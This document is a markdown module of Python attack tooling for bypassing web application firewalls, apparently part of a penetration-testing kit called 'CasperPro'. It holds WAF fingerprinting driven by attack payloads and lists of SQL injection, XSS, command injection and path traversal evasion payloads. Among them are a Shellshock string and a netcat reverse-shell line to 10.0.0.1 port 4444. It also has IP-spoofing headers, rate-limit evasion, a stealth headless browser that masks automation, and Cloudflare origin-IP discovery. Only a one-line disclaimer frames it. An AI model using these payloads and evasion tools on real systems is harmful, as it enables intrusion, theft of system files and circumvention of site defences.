# CasperPro WAF Bypass & Evasion Module

> Advanced techniques for bypassing Web Application Firewalls, rate limiting, bot detection, and security controls

## Overview

This module provides comprehensive evasion techniques for penetration testing environments protected by security controls. All techniques should only be used with proper authorization.

---

## 1. WAF Detection and Fingerprinting

### WAF Detector

```python
# waf_detector.py
import subprocess
import re
import json
from typing import Dict, List, Optional

class WAFDetector:
    """Detect and fingerprint Web Application Firewalls"""
    
    def __init__(self, target: str):
        self.target = target.rstrip("/")
        self.detected_waf = None
        
        # WAF signatures based on response characteristics
        self.waf_signatures = {
            "cloudflare": {
                "headers": ["cf-ray", "cf-cache-status", "__cfduid"],
                "body": ["cloudflare", "ray id:", "cloudflare ray id"],
                "cookies": ["__cfduid", "cf_clearance"],
                "status_page": "attention required! | cloudflare"
            },
            "aws_waf": {
                "headers": ["x-amzn-requestid", "x-amz-cf-id"],
                "body": ["aws waf", "request blocked"],
                "status": [403]
            },
            "akamai": {
                "headers": ["akamai", "x-akamai-transformed"],
                "body": ["akamai", "access denied", "reference #"],
                "cookies": ["akamai"]
            },
            "imperva_incapsula": {
                "headers": ["x-cdn", "x-iinfo"],
                "body": ["incapsula", "imperva", "robot or human"],
                "cookies": ["incap_ses", "visid_incap", "__incap_ses"]
            },
            "f5_big_ip": {
                "headers": ["x-wa-info", "f5"],
                "body": ["the requested url was rejected", "f5 networks"],
                "cookies": ["bigipserver", "ts", "f5"]
            },
            "sucuri": {
                "headers": ["x-sucuri-id", "x-sucuri-cache"],
                "body": ["sucuri", "cloudproxy", "access denied - sucuri"],
                "cookies": ["sucuri"]
            },
            "modsecurity": {
                "headers": ["server: apache", "mod_security"],
                "body": ["mod_security", "this request was blocked", "modsecurity"],
                "status": [403, 406]
            },
            "barracuda": {
                "headers": ["barra_counter"],
                "body": ["barracuda", "you have been blocked"],
                "cookies": ["barra"]
            },
            "fortinet_fortiweb": {
                "headers": ["fortigate", "fortiwafs"],
                "body": ["fortigate", "web filter", "fortinet"],
                "cookies": ["fortiweb"]
            },
            "palo_alto": {
                "headers": ["x-pan-server"],
                "body": ["palo alto", "threat prevention"],
            },
            "radware": {
                "headers": ["x-radware-id"],
                "body": ["radware", "appwall"],
            },
            "azure_front_door": {
                "headers": ["x-azure-ref", "x-fd-healthprobe"],
                "body": ["azure front door", "microsoft"],
            }
        }
        
        # Attack payloads to trigger WAF
        self.trigger_payloads = [
            "<script>alert(1)</script>",
            "' OR '1'='1",
            "../../../etc/passwd",
            "${7*7}",
            "{{7*7}}",
            "; cat /etc/passwd",
            "() { :; }; /bin/bash -c 'cat /etc/passwd'",
        ]
    
    def curl(self, url: str, headers: Dict = None) -> Dict:
        """Make HTTP request and capture full response"""
        cmd = ["curl", "-s", "-i", "-k", "--max-time", "15", "-A", 
               "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"]
        
        if headers:
            for k, v in headers.items():
                cmd.extend(["-H", f"{k}: {v}"])
        
        cmd.append(url)
        
        result = subprocess.run(cmd, capture_output=True, text=True)
        output = result.stdout
        
        # Parse response
        parts = output.split("\r\n\r\n", 1)
        header_section = parts[0]
        body = parts[1] if len(parts) > 1 else ""
        
        # Parse status
        status_match = re.search(r"HTTP/[\d.]+ (\d+)", header_section)
        status = int(status_match.group(1)) if status_match else 0
        
        # Parse headers
        resp_headers = {}
        for line in header_section.split("\r\n")[1:]:
            if ": " in line:
                k, v = line.split(": ", 1)
                resp_headers[k.lower()] = v.lower()
        
        return {
            "status": status,
            "headers": resp_headers,
            "body": body.lower(),
            "raw": output
        }
    
    def detect(self) -> Dict:
        """Detect WAF by analyzing responses"""
        print(f"[*] Detecting WAF on {self.target}")
        
        # Normal request first
        normal = self.curl(self.target)
        
        # Trigger WAF with malicious payloads
        waf_responses = []
        for payload in self.trigger_payloads:
            url = f"{self.target}/?test={payload}"
            response = self.curl(url)
            waf_responses.append(response)
        
        # Analyze responses
        detected = []
        
        for waf_name, signatures in self.waf_signatures.items():
            score = 0
            evidence = []
            
            for response in [normal] + waf_responses:
                # Check headers
                for header in signatures.get("headers", []):
                    if header in response["headers"] or any(header in h for h in response["headers"]):
                        score += 2
                        evidence.append(f"Header: {header}")
                
                # Check body
                for pattern in signatures.get("body", []):
                    if pattern in response["body"]:
                        score += 3
                        evidence.append(f"Body: {pattern}")
                
                # Check cookies
                cookies = response["headers"].get("set-cookie", "")
                for cookie in signatures.get("cookies", []):
                    if cookie in cookies:
                        score += 2
                        evidence.append(f"Cookie: {cookie}")
            
            if score >= 3:
                detected.append({
                    "waf": waf_name,
                    "confidence": min(score * 10, 100),
                    "evidence": list(set(evidence))
                })
        
        # Sort by confidence
        detected.sort(key=lambda x: x["confidence"], reverse=True)
        
        if detected:
            self.detected_waf = detected[0]["waf"]
            print(f"[!] WAF Detected: {detected[0]['waf']} (confidence: {detected[0]['confidence']}%)")
        else:
            print("[+] No WAF detected")
        
        return {
            "target": self.target,
            "waf_detected": detected[0] if detected else None,
            "all_detections": detected
        }
    
    def get_bypass_techniques(self) -> List[str]:
        """Get recommended bypass techniques for detected WAF"""
        if not self.detected_waf:
            return []
        
        techniques = {
            "cloudflare": [
                "Origin IP discovery via DNS history",
                "Use Cloudflare bypass headers",
                "IPv6 addressing",
                "Unicode normalization bypass",
            ],
            "aws_waf": [
                "Case variation",
                "URL encoding variations",
                "Parameter pollution",
                "JSON body instead of URL params",
            ],
            "modsecurity": [
                "Comment injection in SQL",
                "Null byte injection",
                "Encoding chains",
                "Anomaly score manipulation",
            ],
            "imperva_incapsula": [
                "Request header manipulation",
                "Slow HTTP attacks",
                "Cookie manipulation",
            ],
        }
        
        return techniques.get(self.detected_waf, [])
```

---

## 2. WAF Bypass Techniques

### Comprehensive Bypass Framework

```python
# waf_bypass.py
import subprocess
import json
import urllib.parse
import base64
from typing import Dict, List, Callable

class WAFBypass:
    """Comprehensive WAF bypass techniques"""
    
    def __init__(self, target: str, token: str = None):
        self.target = target.rstrip("/")
        self.token = token
        self.successful_bypasses = []
    
    # ==================
    # Encoding Bypasses
    # ==================
    
    def url_encode(self, payload: str) -> str:
        """Standard URL encoding"""
        return urllib.parse.quote(payload)
    
    def double_url_encode(self, payload: str) -> str:
        """Double URL encoding"""
        return urllib.parse.quote(urllib.parse.quote(payload))
    
    def unicode_encode(self, payload: str) -> str:
        """Unicode encoding for WAF bypass"""
        result = ""
        for char in payload:
            if char.isalpha():
                result += f"%u00{ord(char):02x}"
            else:
                result += char
        return result
    
    def hex_encode(self, payload: str) -> str:
        """Hex encoding"""
        return "".join(f"%{ord(c):02x}" for c in payload)
    
    def html_entity_encode(self, payload: str) -> str:
        """HTML entity encoding"""
        return "".join(f"&#{ord(c)};" for c in payload)
    
    def base64_encode(self, payload: str) -> str:
        """Base64 encoding"""
        return base64.b64encode(payload.encode()).decode()
    
    # ==================
    # SQL Injection Bypasses
    # ==================
    
    def sql_comment_bypass(self, payload: str) -> List[str]:
        """SQL injection with comment obfuscation"""
        variations = [
            payload.replace(" ", "/**/"),
            payload.replace(" ", "/*!*/"),
            payload.replace(" ", "/*!50000*/"),
            payload.replace("SELECT", "/*!50000SELECT*/"),
            payload.replace("UNION", "/*!50000UNION*/"),
            payload.replace("OR", "||"),
            payload.replace("AND", "&&"),
        ]
        return variations
    
    def sql_case_bypass(self, payload: str) -> List[str]:
        """Case variation bypass"""
        import random
        
        def randomize_case(s):
            return "".join(c.upper() if random.random() > 0.5 else c.lower() for c in s)
        
        return [randomize_case(payload) for _ in range(5)]
    
    def sql_whitespace_bypass(self, payload: str) -> List[str]:
        """Alternative whitespace characters"""
        alternatives = [
            payload.replace(" ", "\t"),
            payload.replace(" ", "\n"),
            payload.replace(" ", "\r"),
            payload.replace(" ", "%09"),  # Tab
            payload.replace(" ", "%0a"),  # Newline
            payload.replace(" ", "%0c"),  # Form feed
            payload.replace(" ", "%0d"),  # Carriage return
            payload.replace(" ", "+"),
        ]
        return alternatives
    
    def sql_function_bypass(self, payload: str) -> List[str]:
        """Function-based bypasses"""
        return [
            payload.replace("CONCAT", "CONCAT_WS"),
            payload.replace("CHAR(", "CHR("),
            f"REVERSE(REVERSE({payload}))",
        ]
    
    # ==================
    # XSS Bypasses
    # ==================
    
    def xss_tag_bypasses(self) -> List[str]:
        """XSS payloads with tag variations"""
        return [
            "<ScRiPt>alert(1)</ScRiPt>",
            "<script/x>alert(1)</script>",
            "<script\t>alert(1)</script>",
            "<script\n>alert(1)</script>",
            "<script\r>alert(1)</script>",
            "<script >alert(1)</script >",
            "<<script>script>alert(1)</script>",
            "<scr<script>ipt>alert(1)</scr</script>ipt>",
            "<SCRIPT>alert(1)</SCRIPT>",
            "<scr\x00ipt>alert(1)</scr\x00ipt>",
        ]
    
    def xss_event_bypasses(self) -> List[str]:
        """Event handler XSS bypasses"""
        return [
            "<img src=x onerror=alert(1)>",
            "<img/src=x onerror=alert(1)>",
            "<img src=x onerror='alert(1)'>",
            "<img src=x onerror=\"alert(1)\">",
            "<img src=x onerror=alert`1`>",
            "<svg onload=alert(1)>",
            "<svg/onload=alert(1)>",
            "<body onload=alert(1)>",
            "<input onfocus=alert(1) autofocus>",
            "<marquee onstart=alert(1)>",
            "<video><source onerror=alert(1)>",
            "<audio src=x onerror=alert(1)>",
            "<details open ontoggle=alert(1)>",
            "<iframe onload=alert(1)>",
            "<object data=javascript:alert(1)>",
            "<embed src=javascript:alert(1)>",
        ]
    
    def xss_encoding_bypasses(self) -> List[str]:
        """Encoded XSS payloads"""
        return [
            "javascript:alert(1)",
            "java%0ascript:alert(1)",
            "java%0dscript:alert(1)",
            "java%09script:alert(1)",
            "\\x3cscript\\x3ealert(1)\\x3c/script\\x3e",
            "\\u003cscript\\u003ealert(1)\\u003c/script\\u003e",
            "<script>\\u0061lert(1)</script>",
            "<script>al\\u0065rt(1)</script>",
            "data:text/html,<script>alert(1)</script>",
            "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
        ]
    
    def xss_protocol_bypasses(self) -> List[str]:
        """Protocol-based XSS bypasses"""
        return [
            "javascript:alert(1)",
            "JaVaScRiPt:alert(1)",
            "javascript\x00:alert(1)",
            " javascript:alert(1)",
            "\tjavascript:alert(1)",
            "\njavascript:alert(1)",
            "vbscript:alert(1)",
            "livescript:alert(1)",
        ]
    
    # ==================
    # Command Injection Bypasses
    # ==================
    
    def cmd_separator_bypasses(self, command: str) -> List[str]:
        """Command separator variations"""
        separators = [
            f"; {command}",
            f"| {command}",
            f"|| {command}",
            f"& {command}",
            f"&& {command}",
            f"`{command}`",
            f"$({command})",
            f"\n{command}",
            f"%0a{command}",
            f"%0d{command}",
            f"{{command}}",
        ]
        return separators
    
    def cmd_space_bypasses(self, command: str) -> List[str]:
        """Space character bypasses for command injection"""
        return [
            command.replace(" ", "${IFS}"),
            command.replace(" ", "$IFS$9"),
            command.replace(" ", "%09"),
            command.replace(" ", "<"),
            command.replace(" ", "{,}"),
            command.replace(" ", "%20"),
            command.replace("cat", "c''at"),
            command.replace("cat", "c\"\"at"),
            command.replace("cat", "c\\at"),
            command.replace("/", "${HOME:0:1}"),
        ]
    
    def cmd_char_bypasses(self, command: str) -> List[str]:
        """Character-based command bypasses"""
        return [
            f"/???/??t /etc/passwd",  # /bin/cat
            f"/???/n? -e /???/b??h 10.0.0.1 4444",  # /bin/nc
            command.replace("cat", "'c'at"),
            command.replace("cat", "\"c\"at"),
            command.replace("cat", "c\\a\\t"),
            command.replace("cat", "${PATH:0:1}..${PATH:0:1}bin${PATH:0:1}cat"),
        ]
    
    # ==================
    # Path Traversal Bypasses
    # ==================
    
    def path_traversal_bypasses(self, file: str = "/etc/passwd") -> List[str]:
        """Path traversal bypass variations"""
        return [
            f"....//....//....//....//..../{file}",
            f"..%2f..%2f..%2f..%2f..%2f{file}",
            f"..%252f..%252f..%252f..%252f{file}",
            f"..%c0%af..%c0%af..%c0%af{file}",
            f"..%ef%bc%8f..%ef%bc%8f{file}",
            f"....%5c....%5c....%5c{file}",
            f"..\\..\\..\\..\\{file}",
            f"..%5c..%5c..%5c{file}",
            f"/..../..../..../..../..{file}",
            f"/%2e%2e/%2e%2e/%2e%2e/{file}",
            f".%00./.%00./.%00./{file}",
            f"..;/{file}",  # Tomcat specific
        ]
    
    # ==================
    # HTTP Method Bypasses
    # ==================
    
    def method_override_headers(self) -> Dict[str, str]:
        """Headers for HTTP method override"""
        return {
            "X-HTTP-Method-Override": "PUT",
            "X-HTTP-Method": "DELETE",
            "X-Method-Override": "PATCH",
        }
    
    # ==================
    # Header Manipulation
    # ==================
    
    def ip_spoof_headers(self) -> List[Dict[str, str]]:
        """Headers to spoof IP address"""
        ips = ["127.0.0.1", "localhost", "10.0.0.1", "192.168.1.1", "0.0.0.0"]
        headers = []
        
        for ip in ips:
            headers.append({
                "X-Forwarded-For": ip,
                "X-Real-IP": ip,
                "X-Originating-IP": ip,
                "X-Remote-IP": ip,
                "X-Remote-Addr": ip,
                "X-Client-IP": ip,
                "True-Client-IP": ip,
                "Client-IP": ip,
                "Forwarded": f"for={ip}",
                "X-Forwarded-Host": "localhost",
            })
        
        return headers
    
    def user_agent_bypasses(self) -> List[str]:
        """User agent strings to bypass bot detection"""
        return [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15",
            "curl/7.68.0",  # Sometimes allowed for API testing
        ]
    
    # ==================
    # Testing Framework
    # ==================
    
    def curl(self, url: str, method: str = "GET", headers: Dict = None,
             data: str = None) -> Dict:
        """Execute request with bypass"""
        cmd = ["curl", "-s", "-k", "-w", "\n%{http_code}", "-X", method]
        
        if self.token:
            cmd.extend(["-H", f"Authorization: Bearer {self.token}"])
        
        if headers:
            for k, v in headers.items():
                cmd.extend(["-H", f"{k}: {v}"])
        
        if data:
            cmd.extend(["-d", data])
        
        cmd.append(url)
        
        result = subprocess.run(cmd, capture_output=True, text=True)
        output = result.stdout.strip()
        lines = output.rsplit("\n", 1)
        
        return {
            "body": lines[0] if len(lines) > 1 else "",
            "status": int(lines[-1]) if lines[-1].isdigit() else 0
        }
    
    def test_sql_bypasses(self, url: str, param: str = "id") -> List[Dict]:
        """Test SQL injection bypasses"""
        findings = []
        base_payload = "1' OR '1'='1"
        
        print(f"[*] Testing SQL injection bypasses on {url}")
        
        # Test comment bypasses
        for payload in self.sql_comment_bypass(base_payload):
            test_url = f"{url}?{param}={urllib.parse.quote(payload)}"
            response = self.curl(test_url)
            
            if self._is_sqli_success(response):
                findings.append({
                    "type": "SQLi Bypass",
                    "technique": "Comment obfuscation",
                    "payload": payload,
                    "url": test_url
                })
                print(f"[!] Bypass found: {payload[:50]}...")
        
        # Test case bypasses
        for payload in self.sql_case_bypass(base_payload):
            test_url = f"{url}?{param}={urllib.parse.quote(payload)}"
            response = self.curl(test_url)
            
            if self._is_sqli_success(response):
                findings.append({
                    "type": "SQLi Bypass",
                    "technique": "Case variation",
                    "payload": payload,
                    "url": test_url
                })
        
        # Test whitespace bypasses
        for payload in self.sql_whitespace_bypass(base_payload):
            test_url = f"{url}?{param}={urllib.parse.quote(payload)}"
            response = self.curl(test_url)
            
            if self._is_sqli_success(response):
                findings.append({
                    "type": "SQLi Bypass",
                    "technique": "Whitespace variation",
                    "payload": payload,
                    "url": test_url
                })
        
        # Test encoding bypasses
        for encode_func in [self.url_encode, self.double_url_encode, self.hex_encode]:
            encoded = encode_func(base_payload)
            test_url = f"{url}?{param}={encoded}"
            response = self.curl(test_url)
            
            if self._is_sqli_success(response):
                findings.append({
                    "type": "SQLi Bypass",
                    "technique": encode_func.__name__,
                    "payload": encoded,
                    "url": test_url
                })
        
        self.successful_bypasses.extend(findings)
        return findings
    
    def test_xss_bypasses(self, url: str, param: str = "q") -> List[Dict]:
        """Test XSS bypasses"""
        findings = []
        
        print(f"[*] Testing XSS bypasses on {url}")
        
        all_payloads = (
            self.xss_tag_bypasses() + 
            self.xss_event_bypasses() + 
            self.xss_encoding_bypasses()
        )
        
        for payload in all_payloads:
            test_url = f"{url}?{param}={urllib.parse.quote(payload)}"
            response = self.curl(test_url)
            
            # Check if payload is reflected
            if payload in response["body"] or "alert" in response["body"]:
                findings.append({
                    "type": "XSS Bypass",
                    "payload": payload,
                    "url": test_url
                })
                print(f"[!] XSS bypass found: {payload[:50]}...")
        
        self.successful_bypasses.extend(findings)
        return findings
    
    def test_path_traversal_bypasses(self, url: str, param: str = "file") -> List[Dict]:
        """Test path traversal bypasses"""
        findings = []
        
        print(f"[*] Testing path traversal bypasses on {url}")
        
        for payload in self.path_traversal_bypasses():
            test_url = f"{url}?{param}={urllib.parse.quote(payload)}"
            response = self.curl(test_url)
            
            if "root:" in response["body"] or "nobody:" in response["body"]:
                findings.append({
                    "type": "Path Traversal Bypass",
                    "payload": payload,
                    "url": test_url,
                    "evidence": response["body"][:200]
                })
                print(f"[!] Path traversal bypass found!")
        
        self.successful_bypasses.extend(findings)
        return findings
    
    def test_ip_bypass(self, url: str) -> List[Dict]:
        """Test IP-based access control bypasses"""
        findings = []
        
        print(f"[*] Testing IP bypass headers on {url}")
        
        for headers in self.ip_spoof_headers():
            response = self.curl(url, headers=headers)
            
            if response["status"] == 200:
                findings.append({
                    "type": "IP Bypass",
                    "headers": headers,
                    "url": url
                })
                print(f"[!] IP bypass successful with headers!")
                break
        
        self.successful_bypasses.extend(findings)
        return findings
    
    def _is_sqli_success(self, response: Dict) -> bool:
        """Check if SQL injection was successful"""
        indicators = ["sql", "syntax", "mysql", "error in your sql",
                     "sqlite", "postgresql", "oracle", "mssql"]
        
        # Error-based detection
        if any(ind in response["body"].lower() for ind in indicators):
            return True
        
        # Boolean-based detection (would need baseline comparison)
        return False
    
    def generate_report(self) -> Dict:
        """Generate bypass testing report"""
        report = {
            "target": self.target,
            "total_bypasses": len(self.successful_bypasses),
            "bypasses_by_type": {},
            "findings": self.successful_bypasses
        }
        
        for bypass in self.successful_bypasses:
            bypass_type = bypass.get("type", "Unknown")
            if bypass_type not in report["bypasses_by_type"]:
                report["bypasses_by_type"][bypass_type] = 0
            report["bypasses_by_type"][bypass_type] += 1
        
        return report
```

---

## 3. Rate Limiting Evasion

```python
# rate_limit_evasion.py
import subprocess
import time
import random
from typing import Dict, List
from concurrent.futures import ThreadPoolExecutor

class RateLimitEvasion:
    """Techniques to evade rate limiting"""
    
    def __init__(self, target: str, token: str = None):
        self.target = target.rstrip("/")
        self.token = token
    
    def detect_rate_limit(self, url: str, requests: int = 50) -> Dict:
        """Detect rate limiting thresholds"""
        print(f"[*] Detecting rate limits on {url}")
        
        results = []
        
        for i in range(requests):
            start = time.time()
            response = self.curl(url)
            elapsed = time.time() - start
            
            results.append({
                "request": i + 1,
                "status": response["status"],
                "time": elapsed
            })
            
            if response["status"] == 429:
                print(f"[!] Rate limit hit at request {i + 1}")
                return {
                    "rate_limited": True,
                    "threshold": i + 1,
                    "retry_after": self._get_retry_after(response)
                }
        
        return {
            "rate_limited": False,
            "requests_made": requests
        }
    
    def _get_retry_after(self, response: Dict) -> int:
        """Extract Retry-After header"""
        # Would parse from response headers
        return 60
    
    def curl(self, url: str, headers: Dict = None) -> Dict:
        """Make HTTP request"""
        cmd = ["curl", "-s", "-w", "\n%{http_code}", "-k"]
        
        if self.token:
            cmd.extend(["-H", f"Authorization: Bearer {self.token}"])
        
        if headers:
            for k, v in headers.items():
                cmd.extend(["-H", f"{k}: {v}"])
        
        cmd.append(url)
        
        result = subprocess.run(cmd, capture_output=True, text=True)
        output = result.stdout.strip()
        lines = output.rsplit("\n", 1)
        
        return {
            "body": lines[0] if len(lines) > 1 else "",
            "status": int(lines[-1]) if lines[-1].isdigit() else 0
        }
    
    # ==================
    # Evasion Techniques
    # ==================
    
    def ip_rotation(self, url: str, proxies: List[str]) -> Dict:
        """Rotate through different proxy IPs"""
        results = []
        
        for proxy in proxies:
            cmd = ["curl", "-s", "-x", proxy, "-k", url]
            result = subprocess.run(cmd, capture_output=True, text=True)
            
            if "429" not in result.stdout:
                results.append({"proxy": proxy, "success": True})
            else:
                results.append({"proxy": proxy, "success": False})
        
        return {"results": results}
    
    def header_rotation(self, url: str, requests: int = 100) -> Dict:
        """Rotate identifying headers to appear as different clients"""
        user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Safari/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) Firefox/120.0",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0) Mobile/15E148",
            "Mozilla/5.0 (Android 13; Mobile) Chrome/120.0.0.0",
        ]
        
        successful = 0
        rate_limited = 0
        
        for i in range(requests):
            headers = {
                "User-Agent": random.choice(user_agents),
                "X-Forwarded-For": f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
                "X-Real-IP": f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
            }
            
            response = self.curl(url, headers)
            
            if response["status"] != 429:
                successful += 1
            else:
                rate_limited += 1
            
            # Small delay to avoid detection
            time.sleep(random.uniform(0.1, 0.3))
        
        return {
            "technique": "Header rotation",
            "total_requests": requests,
            "successful": successful,
            "rate_limited": rate_limited
        }
    
    def distributed_requests(self, url: str, requests: int = 100,
                            workers: int = 10, delay: float = 0.5) -> Dict:
        """Distribute requests across time and workers"""
        
        def make_request(_):
            time.sleep(random.uniform(0, delay))
            return self.curl(url)
        
        results = []
        
        with ThreadPoolExecutor(max_workers=workers) as executor:
            futures = list(executor.map(make_request, range(requests)))
            results = futures
        
        successful = sum(1 for r in results if r["status"] != 429)
        
        return {
            "technique": "Distributed requests",
            "total_requests": requests,
            "workers": workers,
            "successful": successful,
            "rate_limited": requests - successful
        }
    
    def case_variation_bypass(self, url: str) -> Dict:
        """Test if rate limiting is case-sensitive"""
        variations = [
            url,
            url.upper(),
            url.lower(),
            url.replace("/", "//"),
            url + "/",
            url + "?",
            url + "#",
            url.replace("https://", "https://www.").replace("www.www.", "www."),
        ]
        
        results = []
        
        for variation in variations:
            try:
                response = self.curl(variation)
                results.append({
                    "url": variation,
                    "status": response["status"]
                })
            except:
                pass
        
        return {"technique": "URL variation", "results": results}
    
    def parameter_pollution(self, url: str, param: str = "id",
                           value: str = "1") -> Dict:
        """Test if parameter pollution bypasses rate limit"""
        variations = [
            f"{url}?{param}={value}",
            f"{url}?{param}={value}&{param}={value}",
            f"{url}?{param}[]={value}",
            f"{url}?{param}[0]={value}",
            f"{url}?{param}%00={value}",
        ]
        
        results = []
        
        for variation in variations:
            response = self.curl(variation)
            results.append({
                "url": variation,
                "status": response["status"]
            })
        
        return {"technique": "Parameter pollution", "results": results}
```

---

## 4. Bot Detection Evasion

### Playwright Stealth Configuration

```python
# stealth_browser.py
from playwright.sync_api import sync_playwright
import random
import time

class StealthBrowser:
    """Browser automation with bot detection evasion"""
    
    def __init__(self, proxy: str = None):
        self.proxy = proxy
        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
        ]
        
        self.viewports = [
            {"width": 1920, "height": 1080},
            {"width": 1366, "height": 768},
            {"width": 1536, "height": 864},
            {"width": 1440, "height": 900},
        ]
    
    def create_stealth_context(self, playwright):
        """Create browser context with stealth settings"""
        
        browser_args = [
            "--disable-blink-features=AutomationControlled",
            "--disable-features=IsolateOrigins,site-per-process",
            "--disable-site-isolation-trials",
            "--disable-web-security",
            "--no-sandbox",
        ]
        
        launch_options = {
            "headless": True,
            "args": browser_args,
        }
        
        if self.proxy:
            launch_options["proxy"] = {"server": self.proxy}
        
        browser = playwright.chromium.launch(**launch_options)
        
        # Randomize fingerprint
        viewport = random.choice(self.viewports)
        user_agent = random.choice(self.user_agents)
        
        context = browser.new_context(
            viewport=viewport,
            user_agent=user_agent,
            ignore_https_errors=True,
            java_script_enabled=True,
            locale="en-US",
            timezone_id="America/New_York",
            geolocation={"latitude": 40.7128, "longitude": -74.0060},
            permissions=["geolocation"],
            color_scheme="light",
        )
        
        return browser, context
    
    def add_stealth_scripts(self, page):
        """Inject scripts to evade detection"""
        
        # Override webdriver property
        page.add_init_script("""
            Object.defineProperty(navigator, 'webdriver', {
                get: () => undefined
            });
        """)
        
        # Override plugins
        page.add_init_script("""
            Object.defineProperty(navigator, 'plugins', {
                get: () => [1, 2, 3, 4, 5]
            });
        """)
        
        # Override languages
        page.add_init_script("""
            Object.defineProperty(navigator, 'languages', {
                get: () => ['en-US', 'en']
            });
        """)
        
        # Override permissions
        page.add_init_script("""
            const originalQuery = window.navigator.permissions.query;
            window.navigator.permissions.query = (parameters) => (
                parameters.name === 'notifications' ?
                    Promise.resolve({ state: Notification.permission }) :
                    originalQuery(parameters)
            );
        """)
        
        # Override chrome object
        page.add_init_script("""
            window.chrome = {
                runtime: {}
            };
        """)
        
        # Remove automation indicators
        page.add_init_script("""
            delete window.cdc_adoQpoasnfa76pfcZLmcfl_Array;
            delete window.cdc_adoQpoasnfa76pfcZLmcfl_Promise;
            delete window.cdc_adoQpoasnfa76pfcZLmcfl_Symbol;
        """)
    
    def human_like_interaction(self, page):
        """Add human-like behavior patterns"""
        
        # Random mouse movements
        page.mouse.move(
            random.randint(100, 500),
            random.randint(100, 500)
        )
        
        # Random scroll
        page.evaluate(f"window.scrollBy(0, {random.randint(100, 300)})")
        
        # Random delays
        time.sleep(random.uniform(0.5, 2.0))
    
    def navigate_with_stealth(self, url: str):
        """Navigate to URL with all stealth features"""
        
        with sync_playwright() as p:
            browser, context = self.create_stealth_context(p)
            page = context.new_page()
            
            self.add_stealth_scripts(page)
            
            # Navigate
            page.goto(url)
            page.wait_for_load_state("networkidle")
            
            # Human-like behavior
            self.human_like_interaction(page)
            
            # Get content
            content = page.content()
            cookies = context.cookies()
            
            browser.close()
            
            return {
                "content": content,
                "cookies": cookies
            }
```

---

## 5. Cloudflare Specific Bypasses

```python
# cloudflare_bypass.py
import subprocess
import json
import socket
from typing import Dict, List, Optional

class CloudflareBypass:
    """Cloudflare-specific bypass techniques"""
    
    def __init__(self, target: str):
        self.target = target
        self.domain = target.replace("https://", "").replace("http://", "").split("/")[0]
    
    def find_origin_ip(self) -> List[str]:
        """Attempt to find origin IP behind Cloudflare"""
        potential_ips = []
        
        print(f"[*] Searching for origin IP of {self.domain}")
        
        # Method 1: Check DNS history (would use SecurityTrails, ViewDNS, etc.)
        # This is a placeholder - real implementation would use API
        
        # Method 2: Check for exposed subdomains
        subdomains = ["mail", "ftp", "direct", "origin", "admin", "cpanel", 
                      "webmail", "smtp", "pop", "imap", "test", "dev", "staging"]
        
        for sub in subdomains:
            try:
                ip = socket.gethostbyname(f"{sub}.{self.domain}")
                if not self._is_cloudflare_ip(ip):
                    potential_ips.append({
                        "subdomain": f"{sub}.{self.domain}",
                        "ip": ip,
                        "method": "Subdomain enumeration"
                    })
                    print(f"[!] Potential origin: {ip} ({sub}.{self.domain})")
            except:
                pass
        
        # Method 3: Check for IP in SSL certificate
        # Real implementation would extract IPs from cert
        
        # Method 4: Check Censys/Shodan for hosts with same cert
        # Would require API access
        
        return potential_ips
    
    def _is_cloudflare_ip(self, ip: str) -> bool:
        """Check if IP belongs to Cloudflare"""
        cloudflare_ranges = [
            "103.21.244.0/22", "103.22.200.0/22", "103.31.4.0/22",
            "104.16.0.0/13", "104.24.0.0/14", "108.162.192.0/18",
            "131.0.72.0/22", "141.101.64.0/18", "162.158.0.0/15",
            "172.64.0.0/13", "173.245.48.0/20", "188.114.96.0/20",
            "190.93.240.0/20", "197.234.240.0/22", "198.41.128.0/17"
        ]
        # Simplified check - real implementation would do proper CIDR matching
        return ip.startswith("104.") or ip.startswith("172.64.")
    
    def direct_ip_access(self, origin_ip: str, path: str = "/") -> Dict:
        """Attempt to access origin directly"""
        cmd = [
            "curl", "-s", "-k", "-w", "\n%{http_code}",
            "-H", f"Host: {self.domain}",
            f"https://{origin_ip}{path}"
        ]
        
        result = subprocess.run(cmd, capture_output=True, text=True)
        output = result.stdout.strip()
        lines = output.rsplit("\n", 1)
        
        return {
            "origin_ip": origin_ip,
            "status": int(lines[-1]) if lines[-1].isdigit() else 0,
            "body": lines[0] if len(lines) > 1 else ""
        }
    
    def bypass_headers(self) -> Dict[str, str]:
        """Headers that might bypass Cloudflare rules"""
        return {
            "CF-Connecting-IP": "127.0.0.1",
            "X-Forwarded-For": "127.0.0.1",
            "True-Client-IP": "127.0.0.1",
            "X-Real-IP": "127.0.0.1",
            "X-Originating-IP": "127.0.0.1",
        }
```

---

## Summary

| Technique | Use Case | Effectiveness |
|-----------|----------|---------------|
| **Encoding Bypass** | WAF rule evasion | High for basic WAFs |
| **Comment Injection** | SQL WAF bypass | Medium-High |
| **Case Variation** | Simple filter bypass | Medium |
| **Whitespace Substitution** | Filter bypass | Medium |
| **IP Header Spoofing** | Rate limit evasion | Depends on config |
| **User-Agent Rotation** | Bot detection | Medium |
| **Stealth Browser** | Bot detection | High |
| **Origin IP Discovery** | Cloudflare bypass | Varies |

---

**Important:** These techniques are for authorized security testing only. Unauthorized use is illegal.

